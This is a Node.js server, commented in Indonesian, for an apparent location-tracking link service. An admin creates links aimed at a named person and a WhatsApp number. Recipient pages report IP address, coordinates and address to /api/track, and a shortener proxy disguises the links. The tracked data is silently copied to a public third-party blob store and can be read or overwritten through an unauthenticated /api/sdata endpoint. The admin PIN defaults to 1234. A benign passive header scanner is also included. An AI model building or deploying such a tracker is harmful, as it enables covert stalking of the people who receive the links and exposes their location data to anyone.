// ============================================================
//  SERVER PELACAK LINK LOKASI + TOOLS CEK NOMOR
//  Jalankan: node server.js   (buka http://localhost:8000)
//  Tanpa dependency — murni Node.js bawaan.
// ============================================================
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 8000;
const DATA_FILE = path.join(__dirname, 'lokasi-data.json');
const BLOB_UPSTREAM = 'https://jsonblob.com/api/jsonBlob'; // cadangan cloud (best-effort)

// ============ GANTI PIN ADMIN DI SINI (default: 1234) ============
const ADMIN_PIN = '1234';
// ==================================================================

let db = { links: [], backupId: null };
let BACKUP_ID = null;
let lastSync = 0;

function load(){
  try{ db = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); }
  catch(e){ db = { links: [], backupId: null }; }
  if(!db.links) db.links = [];
  BACKUP_ID = db.backupId || null;
  if(!BACKUP_ID) tryInitBackup();
  else restoreFromBackup();
}
/* Cadangan: sinkron ke jsonblob (best-effort, diam-diam kalau gagal).
   Dipakai supaya data tidak hilang saat hosting gratis me-restart server. */
async function tryInitBackup(){
  try{
    const r = await fetch(BLOB_UPSTREAM, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ links: [] }) });
    if(r.status === 201){
      const id = ((r.headers && r.headers.get('location')) || '').split('/').pop();
      if(id){ BACKUP_ID = id; persistMeta(); }
    }
  }catch(e){}
}
async function restoreFromBackup(){
  try{
    const r = await fetch(BLOB_UPSTREAM + '/' + BACKUP_ID);
    if(r.status === 200){
      const d = await r.json();
      if(d && Array.isArray(d.links) && d.links.length){ db.links = d.links; }
    }
  }catch(e){}
}
function persistMeta(){
  try{ fs.writeFileSync(DATA_FILE, JSON.stringify({ links: db.links, backupId: BACKUP_ID }, null, 2)); }catch(e){}
}
function syncBackup(){
  if(!BACKUP_ID) return;
  const now = Date.now();
  if(now - lastSync < 30000) return;
  lastSync = now;
  fetch(BLOB_UPSTREAM + '/' + BACKUP_ID, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ links: db.links }) }).catch(() => {});
}
function save(){
  persistMeta();
  syncBackup();
}
load();

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js':   'text/javascript; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.svg':  'image/svg+xml'
};

function send(res, code, body, type){
  res.writeHead(code, { 'Content-Type': type || 'text/plain; charset=utf-8' });
  res.end(body);
}
function sendJson(res, code, obj){
  send(res, code, JSON.stringify(obj), 'application/json');
}
function readBody(req){
  return new Promise(resolve => {
    let d = '';
    req.on('data', c => d += c);
    req.on('end', () => {
      try{ resolve(JSON.parse(d || '{}')); } catch(e){ resolve({}); }
    });
  });
}
function sendFile(res, name){
  const f = path.join(__dirname, name);
  if(!fs.existsSync(f)) return send(res, 404, 'File tidak ditemukan');
  const ext = path.extname(f);
  send(res, 200, fs.readFileSync(f), MIME[ext] || 'application/octet-stream');
}

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname;

  try{
    /* ============ API ============ */

    // Buat link baru (admin)
    if(p === '/api/create' && req.method === 'POST'){
      if(u.searchParams.get('pin') !== ADMIN_PIN) return sendJson(res, 403, { error: 'PIN salah' });
      const b = await readBody(req);
      const id = crypto.randomBytes(4).toString('hex');
      const link = {
        id,
        name: (b.name || 'Anonim').slice(0, 60),
        wa: (b.wa || '').replace(/\D/g, '').slice(0, 15),
        msg: (b.msg || '').slice(0, 300),
        createdAt: Date.now(),
        events: [{ type: 'created', ts: Date.now() }]
      };
      db.links.unshift(link);
      save();
      return sendJson(res, 200, { id, url: '/lokasi?id=' + id });
    }

    // Info link (dibaca halaman penerima — publik, tanpa PIN)
    if(p === '/api/link' && req.method === 'GET'){
      const l = db.links.find(x => x.id === u.searchParams.get('id'));
      if(!l) return sendJson(res, 404, { error: 'Link tidak ditemukan' });
      return sendJson(res, 200, { name: l.name, msg: l.msg, wa: l.wa });
    }

    // Tracking beacon — dikirim halaman penerima (publik, tanpa PIN)
    if(p === '/api/track' && req.method === 'POST'){
      const b = await readBody(req);
      const l = db.links.find(x => x.id === b.id);
      if(!l) return sendJson(res, 404, { error: 'id tidak dikenal' });
      const ev = { type: b.event, ts: Date.now(), ip: req.socket.remoteAddress || '' };
      if(b.event === 'location' || b.event === 'ip'){
        ev.lat = Number(b.lat); ev.lon = Number(b.lon);
        ev.acc = (b.acc || '').slice(0, 60);
        ev.addr = (b.addr || '').slice(0, 300);
      }
      l.events.push(ev);
      save();
      return sendJson(res, 200, { ok: true });
    }

    // Daftar semua link (admin)
    if(p === '/api/links' && req.method === 'GET'){
      if(u.searchParams.get('pin') !== ADMIN_PIN) return sendJson(res, 403, { error: 'PIN salah' });
      return sendJson(res, 200, { links: db.links, now: Date.now() });
    }

    // Hapus link (admin)
    if(p === '/api/delete' && req.method === 'POST'){
      if(u.searchParams.get('pin') !== ADMIN_PIN) return sendJson(res, 403, { error: 'PIN salah' });
      const b = await readBody(req);
      db.links = db.links.filter(x => x.id !== b.id);
      save();
      return sendJson(res, 200, { ok: true });
    }

    // ============ PENYIMPANAN DATA LANGSUNG DI SERVER (lokasi-data.json) ============
    // Pengganti jsonblob: tidak ada ketergantungan pihak ketiga & tidak kena rate-limit.
    // Akses baca/tulis terbuka (sama seperti blob publik) — PIN hanya untuk aksi admin.
    if(p === '/api/sdata' && req.method === 'GET'){
      return sendJson(res, 200, { links: db.links });
    }
    if(p === '/api/sdata' && req.method === 'PUT'){
      const b = await readBody(req);
      if(!Array.isArray(b.links)) return sendJson(res, 400, { error: 'format tidak valid' });
      db.links = b.links;
      save();
      return sendJson(res, 200, { ok: true });
    }

    // ============ PROXY PENYIMPANAN CLOUD (jsonblob) — biar bisa dipakai dari pratinjau ============
    // Browser (terutama di iframe pratinjau) sering diblokir akses langsung ke jsonblob (CORS/jaringan).
    // Server mem-forward request-nya; browser cukup memanggil /api/blob… (same-origin, aman).
    if(p === '/api/blob' && req.method === 'POST'){
      const b = await readBody(req);
      try{
        const up = await fetch(BLOB_UPSTREAM, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(b || { links: [] }) });
        const id = ((up.headers && up.headers.get('location')) || '').split('/').pop();
        if(up.status === 201 && id) return sendJson(res, 201, { id });
        return sendJson(res, 502, { error: 'Gagal membuat penyimpanan cloud (' + up.status + ')' });
      }catch(e){ return sendJson(res, 502, { error: 'Gagal menghubungi penyimpanan cloud' }); }
    }
    if(p.startsWith('/api/blob/') && (req.method === 'GET' || req.method === 'PUT' || req.method === 'DELETE')){
      const id = p.slice('/api/blob/'.length);
      if(!/^[A-Za-z0-9-]+$/.test(id)) return sendJson(res, 400, { error: 'id tidak valid' });
      try{
        const opt = { method: req.method, headers: {} };
        if(req.method === 'PUT'){
          opt.headers['Content-Type'] = 'application/json';
          opt.body = JSON.stringify(await readBody(req));
        }
        const up = await fetch(BLOB_UPSTREAM + '/' + id, opt);
        const txt = await up.text();
        res.writeHead(up.status, { 'Content-Type': 'application/json' });
        return res.end(txt);
      }catch(e){ return sendJson(res, 502, { error: 'Gagal menghubungi penyimpanan cloud' }); }
    }

    // ============ LINK PENDEK (proxy shortener — biar bisa dipakai dari browser) ============
    if(p === '/api/shorten' && req.method === 'GET'){
      const url = u.searchParams.get('url') || '';
      if(!/^https?:\/\//.test(url)) return sendJson(res, 400, { error: 'url tidak valid' });
      try{
        const r = await fetch('https://spoo.me/api/v1/shorten', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify({ long_url: url })
        });
        const d = await r.json();
        if(d && d.short_url) return sendJson(res, 200, { short: d.short_url });
      }catch(e){}
      try{
        const r2 = await fetch('https://tinyurl.com/api-create.php?url=' + encodeURIComponent(url));
        const t = (await r2.text()).trim();
        if(/^https?:\/\//.test(t)) return sendJson(res, 200, { short: t });
      }catch(e){}
      return sendJson(res, 502, { error: 'gagal membuat link pendek' });
    }

    // ============ SCANNER KEAMANAN WEBSITE (PASIF — hanya baca konfigurasi) ============
    if(p === '/api/scan' && req.method === 'GET'){
      const raw = u.searchParams.get('url') || '';
      let target;
      try{ target = new URL(raw); }catch(e){ return sendJson(res, 400, { error: 'URL tidak valid. Contoh: https://contoh.com' }); }
      if(target.protocol !== 'http:' && target.protocol !== 'https:') return sendJson(res, 400, { error: 'Hanya mendukung http/https' });
      if(target.hostname === 'localhost' || target.hostname === '127.0.0.1') return sendJson(res, 400, { error: 'Scan terhadap localhost diblokir' });

      function fetchTarget(url, depth){
        return new Promise((resolve, reject) => {
          const mod = url.protocol === 'https:' ? https : http;
          const req = mod.get(url, {
            headers: { 'User-Agent': 'SiteCheck/1.0 (alat cek keamanan pasif)', 'Accept': '*/*' },
            timeout: 12000
          }, res => {
            let size = 0;
            res.on('data', c => { size += c.length; if(size > 3000000){ req.destroy(); } });
            res.on('end', () => {
              let tls = '';
              try{ tls = req.socket && req.socket.getProtocol ? (req.socket.getProtocol() || '') : ''; }catch(e){}
              resolve({ status: res.statusCode, headers: res.headers, size, proto: res.httpVersion, tls });
            });
          });
          req.on('timeout', () => req.destroy(new Error('timeout')));
          req.on('error', e => reject(e));
        });
      }

      try{
        const t0 = Date.now();
        let chain = [];
        let cur = target;
        for(let d = 0; d <= 3; d++){
          const info = await fetchTarget(cur, d);
          chain.push({ url: cur.toString(), status: info.status });
          if([301, 302, 303, 307, 308].includes(info.status) && info.headers.location && d < 3){
            cur = new URL(info.headers.location, cur);
          } else {
            const h = info.headers || {};
            const findings = [];
            const isHttps = cur.protocol === 'https:';

            if(!isHttps) findings.push({ level: 'warn', icon: '🔓', title: 'Tidak menggunakan HTTPS', detail: 'Koneksi tidak terenkripsi. Gunakan HTTPS agar data tidak bisa dibaca pihak lain.' });
            else {
              if(h['strict-transport-security']) findings.push({ level: 'good', icon: '🛡️', title: 'HSTS aktif', detail: 'strict-transport-security terpasang.' });
              else findings.push({ level: 'warn', icon: '⚠️', title: 'HSTS tidak ada', detail: 'Browser tidak dipaksa memakai HTTPS. Tambahkan header Strict-Transport-Security.' });
            }
            if(h['content-security-policy']) findings.push({ level: 'good', icon: '🛡️', title: 'CSP ada', detail: 'content-security-policy terpasang (' + String(h['content-security-policy']).slice(0,60) + '…).' });
            else findings.push({ level: 'warn', icon: '⚠️', title: 'CSP tidak ada', detail: 'Risiko XSS lebih tinggi tanpa Content-Security-Policy. Pertimbangkan menambahkannya.' });
            if(h['x-frame-options']) findings.push({ level: 'good', icon: '🛡️', title: 'X-Frame-Options ada', detail: 'Mencegah situs dipasang di iframe (clickjacking).' });
            else findings.push({ level: 'warn', icon: '⚠️', title: 'X-Frame-Options tidak ada', detail: 'Situs bisa dipasang di iframe orang lain (risiko clickjacking).' });
            if(h['x-content-type-options']) findings.push({ level: 'good', icon: '🛡️', title: 'X-Content-Type-Options ada', detail: 'Mencegah MIME sniffing.' });
            else findings.push({ level: 'warn', icon: '⚠️', title: 'X-Content-Type-Options tidak ada', detail: 'Browser bisa salah menafsirkan tipe file.' });
            if(h['referrer-policy']) findings.push({ level: 'good', icon: '🛡️', title: 'Referrer-Policy ada', detail: 'Kontrol info yang bocor saat pindah halaman.' });
            else findings.push({ level: 'info', icon: 'ℹ️', title: 'Referrer-Policy tidak ada', detail: 'URL halaman bisa ikut terkirim ke situs luar.' });
            if(h['permissions-policy']) findings.push({ level: 'good', icon: '🛡️', title: 'Permissions-Policy ada', detail: 'Membatasi akses fitur browser (kamera, mikrofon, dll.).' });
            else findings.push({ level: 'info', icon: 'ℹ️', title: 'Permissions-Policy tidak ada', detail: 'Fitur browser (kamera/GPS) tidak dibatasi oleh header.' });

            if(h.server) findings.push({ level: 'info', icon: '🖥️', title: 'Server terdeteksi: ' + String(h.server).slice(0,50), detail: 'Informasi versi server yang bocor membantu penyerang mencari celah versi lama.' });
            if(h['x-powered-by']) findings.push({ level: 'warn', icon: '⚠️', title: 'X-Powered-By bocor: ' + String(h['x-powered-by']).slice(0,50), detail: 'Header ini membocorkan teknologi backend. Sebaiknya dihapus.' });

            const cookies = h['set-cookie'];
            if(cookies && cookies.length){
              cookies.forEach(c => {
                if(!/httponly/i.test(c)) findings.push({ level: 'warn', icon: '🍪', title: 'Cookie tanpa HttpOnly', detail: c.split(';')[0] + ' — bisa dibaca JavaScript (risiko XSS mencuri sesi).' });
                if(!/secure/i.test(c)) findings.push({ level: 'warn', icon: '🍪', title: 'Cookie tanpa Secure', detail: c.split(';')[0] + ' — dikirim lewat HTTP biasa.' });
                if(!/samesite/i.test(c)) findings.push({ level: 'info', icon: '🍪', title: 'Cookie tanpa SameSite', detail: c.split(';')[0] + ' — pertimbangkan SameSite=Lax/Strict.' });
              });
            }

            if(isHttps){
              if(/TLSv1\.[01]/.test(info.tls)) findings.push({ level: 'warn', icon: '🔒', title: 'TLS lama: ' + info.tls, detail: 'TLS 1.0/1.1 sudah tidak aman. Wajib TLS 1.2+.' });
              else if(info.tls) findings.push({ level: 'good', icon: '🔒', title: 'TLS: ' + info.tls, detail: 'Versi protokol enkripsi aman.' });
            }
            if(info.status >= 500) findings.push({ level: 'warn', icon: '🩺', title: 'HTTP ' + info.status, detail: 'Server error — bisa jadi indikasi masalah atau celah.' });
            else if(info.status >= 400) findings.push({ level: 'info', icon: 'ℹ️', title: 'HTTP ' + info.status, detail: 'Respon error dari server.' });
            else findings.push({ level: 'good', icon: '✅', title: 'HTTP ' + info.status, detail: 'Situs merespons normal.' });

            return sendJson(res, 200, {
              ok: true,
              url: cur.toString(),
              status: info.status,
              timeMs: Date.now() - t0,
              sizeBytes: info.size,
              proto: info.proto,
              tls: info.tls,
              redirects: chain,
              server: h.server ? String(h.server).slice(0,80) : '',
              findings: findings,
              headers: Object.keys(h).filter(k => !/^cf-ray|^cf-cache|^nel$|^report-to|^server-timing/i.test(k)).slice(0,40).map(k => ({ name: k, value: String(h[k]).slice(0,120) }))
            });
          }
        }
        return sendJson(res, 500, { error: 'Terlalu banyak redirect' });
      }catch(e){
        return sendJson(res, 200, { ok: false, error: 'Tidak bisa mengakses situs: ' + (e && e.message === 'timeout' ? 'timeout (situs lambat/blokir)' : e.message) });
      }
    }

    /* ============ HALAMAN ============ */
    if(p === '/' || p === '/index.html') return sendFile(res, 'index.html');
    if(p === '/admin') return sendFile(res, 'admin.html');
    if(p === '/lokasi') return sendFile(res, 'receiver.html');

    // file statis di root (cek-nomor-hp.html, minta-lokasi.html, dst.)
    const base = path.basename(p);
    if(base && !base.includes('.')) return send(res, 404, 'Not found');
    const f = path.join(__dirname, base);
    if(fs.existsSync(f) && path.dirname(f) === __dirname) return sendFile(res, base);

    send(res, 404, 'Halaman tidak ditemukan');
  }catch(e){
    console.error(e);
    send(res, 500, 'Server error: ' + e.message);
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Server jalan di http://0.0.0.0:' + PORT);
  console.log('   Dashboard admin : /admin  (PIN: ' + ADMIN_PIN + ')');
});
